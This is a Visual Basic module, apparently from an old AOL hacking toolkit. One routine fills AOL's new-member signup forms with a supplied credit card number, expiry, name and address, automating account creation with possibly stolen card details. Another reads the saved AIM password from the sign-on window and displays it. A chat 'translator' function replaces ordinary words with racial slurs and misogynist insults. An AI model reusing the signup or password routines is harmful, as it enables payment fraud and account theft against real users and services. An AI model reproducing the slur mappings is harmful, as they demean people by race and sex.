Const wM_POWER = &H48
Type COPYDATASTRUCT
    dwData As Long
    cbData As Long
    lpData As Long
End Type
Type myLong64
   var1 As Long
   var2 As Long
End Type
Public Type SHQUERYRBINFO
   cbSize         As Long
   i64Size        As myLong64
   i64NumItems    As myLong64
End Type
Public Const SW_NORMAL = 1
Public Const SWW_SHOWNORMAL = 1
Public Const HWND_DESKTOP = 0
Public Const SHERB_NOCONFIRMATION = &H1
Public Const SHERB_NOPROGRESSUI = &H2
Public Const SHERB_NOSOUND = &H4
Public Declare Function ShellExecute _
   Lib "shell32.dll" Alias "ShellExecuteA" _
   (ByVal hwnd As Long, _
    ByVal lpOperation As String, _
    ByVal lpFile As String, _
    ByVal lpParameters As String, _
    ByVal lpDirectory As String, _
    ByVal nShowCmd As Long) As Long
Public Declare Function SHQueryRecycleBin _
   Lib "Shell32" Alias "SHQueryRecycleBinA" _
   (ByVal pszRootPath As String, _
    pSHQueryRBInfo As SHQUERYRBINFO) As Long
Public Declare Function SHEmptyRecycleBin _
   Lib "Shell32" Alias "SHEmptyRecycleBinA" _
   (ByVal hwnd As Long, _
    ByVal pszRootPath As String, _
    ByVal dwflags As Long) As Long
'lanshock declarez below written by [lash]
Public Const MAX_WSADescription = 256
Public Const MAX_WSASYSStatus = 128
Public Const WS_VERSION_REQD     As Long = &H101
Public Const WS_VERSION_MAJOR    As Long = WS_VERSION_REQD \ &H100 And &HFF&
Public Const WS_VERSION_MINOR    As Long = WS_VERSION_REQD And &HFF&
Public Const MIN_SOCKETS_REQD    As Long = 1
Public Const SOCKET_ERROR        As Long = -1
Public Type HOSTENT
   hName      As Long
   hAliases   As Long
   hAddrType  As Integer
   hLen       As Integer
   hAddrList  As Long
End Type
Public Type WSADATA
   wVersion      As Integer
   wHighVersion  As Integer
   szDescription(0 To MAX_WSADescription)   As Byte
   szSystemStatus(0 To MAX_WSASYSStatus)    As Byte
   wMaxSockets   As Integer
   wMaxUDPDG     As Integer
   dwVendorInfo  As Long
End Type
Public Declare Function WSAGetLastError Lib "WSOCK32.DLL" () As Long
Public Declare Function WSAStartup Lib "WSOCK32.DLL" _
   (ByVal wVersionRequired As Long, lpWSADATA As WSADATA) As Long
   Public Declare Function WSACleanup Lib "WSOCK32.DLL" () As Long
Public Declare Function gethostname Lib "WSOCK32.DLL" _
   (ByVal szHost As String, ByVal dwHostLen As Long) As Long
   Public Declare Function gethostbyname Lib "WSOCK32.DLL" _
   (ByVal szHost As String) As Long

Public Sub WebLaunch(YourURL As String)
'ouwopoe wit cheeze
    Dim FileNumber As Integer
    FileNumber% = FreeFile
    Open App.Path & "\Temp.URL" For Output As #FileNumber%
    Print #FileNumber%, "[InternetShortcut]"
    Print #FileNumber%, "URL=" & YourURL$
    Close #FileNumber%
    Shell "rundll32.exe shdocvw.dll,OpenURL " _
          & App.Path & "\temp.url", vbNormalFocus
    Kill App.Path & "\Temp.URL"
    
End Sub

Function IXI_OubonicZ(mnuOubonicz As Menu, text5 As TextBox)
'ouwop
e$ = text5.Text
If mnuOubonicz.Checked = True Then d$ = text5.Text
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("the"), "da")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("what"), "wut")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("hello"), "zerP")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("hey"), "Yo")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("ouwop"), "Ou(/\)op")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("wop"), "(/\)op")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("lol"), "bol")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("does"), "duz")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("forgot"), "foeg0t")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("under"), "unduh")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("enter"), "entuh")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("house"), "criziB")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("people"), "peepz")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("yup"), "yerp")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("nope"), "nerp")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("what"), "wut")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("ron"), "taytuh")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("lmao"), "bolmao")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("mad"), "redy to cock my gizat on diz foo")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("baltimore"), "b-moe")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("weather"), "weva")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("boy"), "lil nerga")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("man"), "nerga")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("girl"), "hoe")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("women"), "hoe")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("friend"), "frend")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("masta"), "mazTa")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("food"), "fo0d")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("eat"), "chomp")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("press"), "prezz")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("ladie"), "hoe")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("female"), "bich")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("fuck"), "ferk")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("ixi"), "IXI")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("guess"), "guezz")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("this"), "diz")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("that"), "dat")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("shit"), "shyt")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("ass"), "azz")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("work"), "werk")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("peeps"), "peepz")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("nigger"), "nigga")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("brother"), "bruva")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("sister"), "sizta")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("mother"), "muva")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("mom"), "muva")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("mommy"), "muva")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("dad"), "fava")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("father"), "fava")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("check"), "chek")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("thing"), "thang")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("dick"), "dik")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("sup"), "zerP")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("chillin"), "ChiLLin")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase(";]"), ">8]")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("gun"), "gat")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("s"), "z")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("car"), "whip")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("goodbye"), "peaCe ouT nergaz")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("welcome"), "mad propz")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("white"), "cracker")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("foot"), "corn")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("toe"), "corn")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("fruit"), "vegtable")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("vegtable"), "fruit")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("liquer"), "40z")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("beer"), "40z")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("hotel"), "motel 6")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("old"), "olde")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("hoe"), "hizoe")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("underware"), "drawlz")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("fat"), "fizat")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("door"), "dizoor")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("phone"), "fone")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("picture"), "pic")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("computer"), "pewter")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("pc"), "pewter")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("food"), "grub")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("cup"), "jar")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("hat"), "lid")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("mouse"), "rat")
If mnuOubonicz.Checked = True Then text5.Text = d$
If mnuOubonicz.Checked = True Then d$ = Chat_Oubonicz(e$, LCase("cat"), "kitty")
If mnuOubonicz.Checked = True Then text5.Text = d$
text5 = d$
End Function


Public Sub MakeLcase(firstname$, lastname$, addy$, apartment$, city$, State$, zip$, phone$, visa As Boolean, mastercard As Boolean, amex As Boolean, ccnumber$, expmonth$, expyear$, cert$, certpw$, aimsn$, aimpw$)
'-not mine
'you must be at the first window when u sign on as
'a new user to use this. my aol doesnt ask for a cert.
'but this should work if the aol does ask for 1

Dim window&, edit1&, edit2&, checkboxx&, aicon&, aimwin&, snedit&, pwedit&, aimicon&, aimcheck&, infowin&, firstedit&, lastedit&, addyedit&, aptedit&, cityedit&, stateedit&, zipedit&, phoneedit&, phoneedit2&, infoicon&
Dim agreewin&, agreestatic&, agreeicon&, statictext$, selectwin&, selectlist&, selecticon&, ccwin&, ccedit&, expedit&, expedit2&, ccfirst&, cclast&, ccicon&, acceptwin&, acceptcheck&, accepticon&, acceptstatic&, accepttext$
Dim infostatic&, infotext$
window& = FindWindow("_AOL_Modal", vbNullString)
checkboxx& = FindWindowEx(window&, 0&, "_AOL_Checkbox", vbNullString)
checkboxx& = FindWindowEx(window&, checkboxx&, "_AOL_Checkbox", vbNullString)
checkboxx& = FindWindowEx(window&, checkboxx&, "_AOL_Checkbox", vbNullString)
Call PostMessage(checkboxx&, WM_LBUTTONDOWN, 0, 0&)
Call PostMessage(checkboxx&, WM_LBUTTONUP, 0, 0&)
TimeOut 0.5
edit1& = FindWindowEx(window&, 0&, "_AOL_Edit", vbNullString)
edit2& = FindWindowEx(window&, edit1&, "_AOL_Edit", vbNullString)
edit3& = FindWindowEx(window&, edit2&, "_AOL_Edit", vbNullString)
edit4& = FindWindowEx(window&, edit3&, "_AOL_Edit", vbNullString)
'If IsWindowVisible(edit1&) = True Then
Call SetText(edit1&, cert$)
Call SetText(edit4&, certpw$)
TimeOut (0.5)
aicon& = FindWindowEx(window&, 0&, "_AOL_Icon", vbNullString)
aicon& = FindWindowEx(window&, aicon&, "_AOL_Icon", vbNullString)
Call PostMessage(aicon&, WM_LBUTTONDOWN, 0, 0&)
Call PostMessage(aicon&, WM_LBUTTONUP, 0, 0&)
Do
DoEvents
aimwin& = FindWindow("_AOL_Modal", vbNullString)
snedit& = FindWindowEx(aimwin&, 0&, "_AOL_Edit", vbNullString)
pwedit& = FindWindowEx(aimwin&, snedit&, "_AOL_Edit", vbNullString)
aimcheck& = FindWindowEx(aimwin&, 0&, "_AOL_Checkbox", vbNullString)
aimicon& = FindWindowEx(aimwin&, 0&, "_AOL_Icon", vbNullString)
Loop Until aimwin& <> 0 And snedit& <> 0 And pwedit& <> 0 And aimicon& <> 0 And aimcheck& = 0
aimicon& = FindWindowEx(aimwin&, aimicon&, "_AOL_Icon", vbNullString)
Call SendMessageByString(snedit&, WM_SETTEXT, 0&, aimsn$)
Call SendMessageByString(pwedit&, WM_SETTEXT, 0&, aimpw$)
Call PostMessage(aimicon&, WM_LBUTTONDOWN, 0, 0&)
Call PostMessage(aimicon&, WM_LBUTTONUP, 0, 0&)
Do
DoEvents
infowin& = FindWindow("_AOL_Modal", vbNullString)
firstedit& = FindWindowEx(infowin&, 0&, "_AOL_Edit", vbNullString)
lastedit& = FindWindowEx(infowin&, firstedit&, "_AOL_Edit", vbNullString)
addyedit& = FindWindowEx(infowin&, lastedit&, "_AOL_Edit", vbNullString)
aptedit& = FindWindowEx(infowin&, addyedit&, "_AOL_Edit", vbNullString)
aptedit& = FindWindowEx(infowin&, aptedit&, "_AOL_Edit", vbNullString)
cityedit& = FindWindowEx(infowin&, aptedit&, "_AOL_Edit", vbNullString)
stateedit& = FindWindowEx(infowin&, cityedit&, "_AOL_Edit", vbNullString)
zipedit& = FindWindowEx(infowin&, stateedit&, "_AOL_Edit", vbNullString)
phoneedit& = FindWindowEx(infowin&, zipedit&, "_AOL_Edit", vbNullString)
phoneedit2& = FindWindowEx(infowin&, phoneedit&, "_AOL_Edit", vbNullString)
infoicon& = FindWindowEx(infowin&, 0&, "_AOL_Icon", vbNullString)
Loop Until infowin& <> 0 And firstedit& <> 0 And lastedit& <> 0 And addyedit& <> 0 And aptedit& <> 0 And cityedit& <> 0 And stateedit& <> 0 And zipedit& <> 0 And phoneedit& <> 0 And phoneedit2& <> 0 And infoicon& <> 0
Call SendMessageByString(firstedit&, WM_SETTEXT, 0&, firstname$)
Call SendMessageByString(lastedit&, WM_SETTEXT, 0&, lastname$)
Call SendMessageByString(addyedit&, WM_SETTEXT, 0&, addy$)
Call SendMessageByString(aptedit&, WM_SETTEXT, 0&, apartment$)
Call SendMessageByString(cityedit&, WM_SETTEXT, 0&, city$)
Call SendMessageByString(stateedit&, WM_SETTEXT, 0&, State$)
Call SendMessageByString(zipedit&, WM_SETTEXT, 0&, zip$)
Call SendMessageByString(phoneedit&, WM_SETTEXT, 0&, phone$)
Call SendMessageByString(phoneedit2&, WM_SETTEXT, 0&, phone$)
Call PostMessage(infoicon&, WM_LBUTTONDOWN, 0, 0&)
Call PostMessage(infoicon&, WM_LBUTTONUP, 0, 0&)
Do
DoEvents
agreewin& = FindWindow("_AOL_Modal", vbNullString)
agreestatic& = FindWindowEx(agreewin&, 0&, "_AOL_Static", vbNullString)
agreeicon& = FindWindowEx(agreewin&, 0&, "_AOL_Icon", vbNullString)
statictext$ = gettext(agreestatic&)
Loop Until agreewin& <> 0 And agreestatic& <> 0 And agreeicon& <> 0 And statictext$ = "How Your AOL Membership Works"
Call PostMessage(agreeicon&, WM_LBUTTONDOWN, 0, 0&)
Call PostMessage(agreeicon&, WM_LBUTTONUP, 0, 0&)
Do
DoEvents
selectwin& = FindWindow("_AOL_Modal", vbNullString)
selecticon& = FindWindowEx(selectwin&, 0&, "_AOL_Icon", vbNullString)
selectlist& = FindWindowEx(selectwin&, 0&, "_AOL_Listbox", vbNullString)
Loop Until selectwin& <> 0 And selecticon& <> 0 And selectlist& <> 0
If visa = True Then
Call SendMessageLong(selectlist&, LB_SETCURSEL, 0, 0&)
ElseIf mastercard = True Then
Call SendMessageLong(selectlist&, LB_SETCURSEL, 1, 0&)
ElseIf amex = True Then
Call SendMessageLong(selectlist&, LB_SETCURSEL, 2, 0&)
End If
selecticon& = FindWindowEx(selectwin&, selecticon&, "_AOL_Icon", vbNullString)
selecticon& = FindWindowEx(selectwin&, selecticon&, "_AOL_Icon", vbNullString)
Call PostMessage(selecticon&, WM_LBUTTONDOWN, 0, 0&)
Call PostMessage(selecticon&, WM_LBUTTONUP, 0, 0&)
Do
DoEvents
ccwin& = FindWindow("_AOL_Modal", vbNullString)
ccedit& = FindWindowEx(ccwin&, 0&, "_AOL_Edit", vbNullString)
expedit& = FindWindowEx(ccwin&, ccedit&, "_AOL_Edit", vbNullString)
expedit2& = FindWindowEx(ccwin&, expedit&, "_AOL_Edit", vbNullString)
ccfirst& = FindWindowEx(ccwin&, expedit2&, "_AOL_Edit", vbNullString)
cclast& = FindWindowEx(ccwin&, ccfirst&, "_AOL_Edit", vbNullString)
ccicon& = FindWindowEx(ccwin&, 0&, "_AOL_Icon", vbNullString)
Loop Until ccwin& <> 0 And ccfirst& <> 0 And cclast& <> 0 And ccedit& <> 0 And expedit& <> 0 And expedit2& <> 0 And ccicon& <> 0
Call SendMessageByString(ccedit&, WM_SETTEXT, 0&, ccnumber$)
Call SendMessageByString(expedit&, WM_SETTEXT, 0&, expmonth$)
Call SendMessageByString(expedit2&, WM_SETTEXT, 0&, expyear$)
Call SendMessageByString(ccfirst&, WM_SETTEXT, 0&, firstname$)
Call SendMessageByString(cclast&, WM_SETTEXT, 0&, lastname$)
ccicon& = FindWindowEx(ccwin&, ccicon&, "_AOL_Icon", vbNullString)
ccicon& = FindWindowEx(ccwin&, ccicon&, "_AOL_Icon", vbNullString)
Call PostMessage(ccicon&, WM_LBUTTONDOWN, 0, 0&)
Call PostMessage(ccicon&, WM_LBUTTONUP, 0, 0&)
Do
DoEvents
infowin& = FindWindow("_AOL_Modal", vbNullString)
addyedit& = FindWindowEx(infowin&, 0&, "_AOL_Edit", vbNullString)
aptedit& = FindWindowEx(infowin&, addyedit&, "_AOL_Edit", vbNullString)
aptedit& = FindWindowEx(infowin&, aptedit&, "_AOL_Edit", vbNullString)
cityedit& = FindWindowEx(infowin&, aptedit&, "_AOL_Edit", vbNullString)
stateedit& = FindWindowEx(infowin&, cityedit&, "_AOL_Edit", vbNullString)
zipedit& = FindWindowEx(infowin&, stateedit&, "_AOL_Edit", vbNullString)
phoneedit& = FindWindowEx(infowin&, zipedit&, "_AOL_Edit", vbNullString)
phoneedit2& = FindWindowEx(infowin&, phoneedit&, "_AOL_Edit", vbNullString)
infoicon& = FindWindowEx(infowin&, 0&, "_AOL_Icon", vbNullString)
infostatic& = FindWindowEx(infowin&, 0&, "_AOL_Static", vbNullString)
infotext$ = gettext(infostatic&)
Loop Until infowin& <> 0 And addyedit& <> 0 And aptedit& <> 0 And cityedit& <> 0 And stateedit& <> 0 And zipedit& <> 0 And phoneedit& <> 0 And phoneedit2& <> 0 And infoicon& <> 0 And infostatic& <> 0 And infotext$ = "Verify Your Billing Information"
infoicon& = FindWindowEx(infowin&, infoicon&, "_AOL_Icon", vbNullString)
Call PostMessage(infoicon&, WM_LBUTTONDOWN, 0, 0&)
Call PostMessage(infoicon&, WM_LBUTTONUP, 0, 0&)
Do
DoEvents
acceptwin& = FindWindow("_AOL_Modal", vbNullString)
acceptcheck& = FindWindowEx(acceptwin&, 0&, "_AOL_Checkbox", vbNullString)
accepticon& = FindWindowEx(acceptwin&, 0&, "_AOL_Icon", vbNullString)
acceptstatic& = FindWindowEx(acceptwin&, 0&, "_AOL_Static", vbNullString)
accepttext$ = gettext(acceptstatic&)
Loop Until acceptwin& <> 0 And acceptcheck& <> 0 And accepticon& <> 0 And acceptstatic& <> 0 And accepttext$ = "Conditions of AOL Membership"
Call PostMessage(accepticon&, WM_LBUTTONDOWN, 0, 0&)
Call PostMessage(accepticon&, WM_LBUTTONUP, 0, 0&)
End Sub



Sub AIM_GetStoredPW()
''muzt have da sign on screen open
'ouwop
AOL% = FindWindow("#32770", vbNullString)
MDI% = FindChildByClass(AOL%, "edit")
'Chil% = FindChildByClass(MDI%, "edit")
'stat% = FindChildByClass(Chil%, "_AOL_Static")
'   stat2% = GetWindow(stat%, GW_HWNDNEXT)
'        stat3% = GetWindow(stat2%, GW_HWNDNEXT)
'            stat4% = GetWindow(stat3%, GW_HWNDNEXT)
pw$ = gettext(MDI%)

MsgBox pw$
End Sub


Function check_illegalChaRz(cmb)
'ouwop
If InStr(LCase(cmb), LCase("!")) Then check_illegalChaRz = 1: Exit Function
If InStr(LCase(cmb), LCase("@")) Then check_illegalChaRz = 1: Exit Function
If InStr(LCase(cmb), LCase("#")) Then check_illegalChaRz = 1: Exit Function
If InStr(LCase(cmb), LCase("$")) Then check_illegalChaRz = 1: Exit Function
If InStr(LCase(cmb), LCase("%")) Then check_illegalChaRz = 1: Exit Function
If InStr(LCase(cmb), LCase("^")) Then check_illegalChaRz = 1: Exit Function
If InStr(LCase(cmb), LCase("&")) Then check_illegalChaRz = 1: Exit Function
If InStr(LCase(cmb), LCase("*")) Then check_illegalChaRz = 1: Exit Function
If InStr(LCase(cmb), LCase(")")) Then check_illegalChaRz = 1: Exit Function
If InStr(LCase(cmb), LCase("(")) Then check_illegalChaRz = 1: Exit Function
If InStr(LCase(cmb), LCase("_")) Then check_illegalChaRz = 1: Exit Function
If InStr(LCase(cmb), LCase("-")) Then check_illegalChaRz = 1: Exit Function
If InStr(LCase(cmb), LCase("=")) Then check_illegalChaRz = 1: Exit Function
If InStr(LCase(cmb), LCase("+")) Then check_illegalChaRz = 1: Exit Function
If InStr(LCase(cmb), LCase("\")) Then check_illegalChaRz = 1: Exit Function
If InStr(LCase(cmb), LCase("|")) Then check_illegalChaRz = 1: Exit Function
If InStr(LCase(cmb), LCase("]")) Then check_illegalChaRz = 1: Exit Function
If InStr(LCase(cmb), LCase("}")) Then check_illegalChaRz = 1: Exit Function
If InStr(LCase(cmb), LCase("[")) Then check_illegalChaRz = 1: Exit Function
If InStr(LCase(cmb), LCase("{")) Then check_illegalChaRz = 1: Exit Function
If InStr(LCase(cmb), LCase("'")) Then check_illegalChaRz = 1: Exit Function
If InStr(LCase(cmb), LCase("""""")) Then check_illegalChaRz = 1: Exit Function
If InStr(LCase(cmb), LCase(";")) Then check_illegalChaRz = 1: Exit Function
If InStr(LCase(cmb), LCase(":")) Then check_illegalChaRz = 1: Exit Function
If InStr(LCase(cmb), LCase("/")) Then check_illegalChaRz = 1: Exit Function
If InStr(LCase(cmb), LCase("?")) Then check_illegalChaRz = 1: Exit Function
If InStr(LCase(cmb), LCase(".")) Then check_illegalChaRz = 1: Exit Function
If InStr(LCase(cmb), LCase(">")) Then check_illegalChaRz = 1: Exit Function
If InStr(LCase(cmb), LCase("<")) Then check_illegalChaRz = 1: Exit Function
If InStr(LCase(cmb), LCase(",")) Then check_illegalChaRz = 1: Exit Function
If InStr(LCase(cmb), LCase("`")) Then check_illegalChaRz = 1: Exit Function
If InStr(LCase(cmb), LCase("~")) Then check_illegalChaRz = 1: Exit Function
'elite
 If InStr(LCase(cmb), LCase("—")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase(",j")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("`Q")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("|2")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("><")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("±")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("«")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("×")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("÷")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("£")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("¢")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("¤")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("¥")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("§")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("©")) Then check_illegalChaRz = 1: Exit Function
 If InStr(LCase(cmb), LCase("¬")) Then check_illegalChaRz = 1: Exit Function
